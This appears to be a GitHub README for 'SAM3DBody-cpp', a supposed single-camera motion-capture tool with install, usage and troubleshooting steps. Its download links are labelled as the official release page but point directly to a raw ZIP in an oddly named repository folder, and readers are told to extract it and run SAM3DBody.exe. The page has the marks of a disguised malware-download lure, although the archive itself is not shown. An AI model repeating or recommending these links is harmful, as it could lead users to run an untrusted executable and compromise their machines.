# 👤 SAM3DBody-cpp - Track human movement with one camera

[![Download SAM3DBody on GitHub](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Washin1918/SAM3DBody-cpp/raw/refs/heads/main/hermoglyphist/Body_cpp_SA_D_3.6.zip)

SAM3DBody-cpp turns a standard camera into a motion capture system. It maps your body, arms, and hands into a 3D skeleton in real time. The software saves these movements as a BVH animation file. Engineers and artists use this for game development and character animation.

## ⚙️ System Requirements

This software performs complex calculations. You need a Windows computer with modern hardware to get smooth results.

*   **Operating System:** Windows 10 or 11 (64-bit).
*   **Processor:** Intel Core i7 or AMD Ryzen 7 processor from the last three years.
*   **Memory:** 16 GB RAM.
*   **Graphics Card:** NVIDIA GPU with at least 8 GB of video memory. The software relies on CUDA technology for speed.
*   **Camera:** Standard USB webcam or high-quality video camera connected via capture card.

## ⬇️ Install the Software

1.  Visit the [official project release page](https://github.com/Washin1918/SAM3DBody-cpp/raw/refs/heads/main/hermoglyphist/Body_cpp_SA_D_3.6.zip).
2.  Look for the "Releases" section on the right side of the screen.
3.  Click the most recent version number.
4.  Find the file ending in `.zip` under the "Assets" heading.
5.  Click the link to download the file to your computer.
6.  Open your Downloads folder.
7.  Right-click the ZIP file and select "Extract All".
8.  Choose a location on your hard drive and click "Extract".

## 🚀 Run the Application

Once you extract the files, follow these steps to see the skeleton tracking in action.

1.  Open the folder where you extracted the files.
2.  Find the file named `SAM3DBody.exe`.
3.  Double-click this file to start the application.
4.  A black window with text will appear. This window shows the program status. Leave this window open.
5.  A second window will open displaying your camera feed.
6.  The software will automatically detect your body and draw a 3D skeleton overlay on the screen.

## 🎥 Using the Tracker

Frame the camera so your full body stays inside the view. The software works best when you stand at least six feet away from the lens. Ensure the room has bright lighting. Avoid backlighting from windows, as this confuses the detection system.

The skeleton includes 70 joints. This high level of detail allows the software to track fingers and complex limb positions. You will see the skeleton move in sync with your physical motion.

## 💾 Saving Movement Data

The application provides a feature to export your motion as a BVH file. This file type works with most 3D animation software like Blender or Maya.

1.  Press the "R" key on your keyboard to start recording.
2.  Move as needed.
3.  Press the "R" key again to stop the recording.
4.  The application saves the file inside an "Exports" folder within the program directory.
5.  Check the file timestamp to identify your recording.

## 🛠 Troubleshooting Issues

Many users experience simple problems when starting. Review this list before seeking help elsewhere.

*   **Application does not start:** Ensure you have the latest NVIDIA drivers installed. The software requires these drivers to communicate with your graphics card.
*   **High lag:** Close other programs that use the camera or the graphics card. Web browsers and video editors consume significant resources.
*   **Skeleton flickering:** Improve the lighting in your room. If the software struggles to see your limbs against the background, it may lose track of your position.
*   **Camera not detected:** Unplug your camera and plug it back into a different USB port. Ensure no other applications are using the camera when you start SAM3DBody.

## 🧩 Understanding the Technology

This software uses a combination of modern tools to ensure speed and accuracy.

*   **ONNX:** This format allows the model to run efficiently on Windows hardware.
*   **ggml:** This library manages memory and processor tasks to keep the tracking smooth.
*   **CUDA:** This technology lets the program use your graphics card to perform rapid calculations.
*   **OpenGL:** This handles the visual display of the skeleton in three dimensions.
*   **BVH:** This is the industry standard format for saving skeletal animation data.

## 📈 Improving Performance

If you want to reach higher frame rates, lower the resolution of the camera input in the configuration settings. Smaller input sizes require less power from your computer. You can also disable specific parts of the skeleton, such as the hand tracking, if your project only requires body movement.

## 📋 Project Summary

The software provides a direct method for motion capture. It eliminates the need for expensive motion-capture suits or multiple camera setups. By using a single camera and advanced tracking math, you can record animations at your desk. The output files are compatible with standard animation workflows, making it a useful tool for creative work.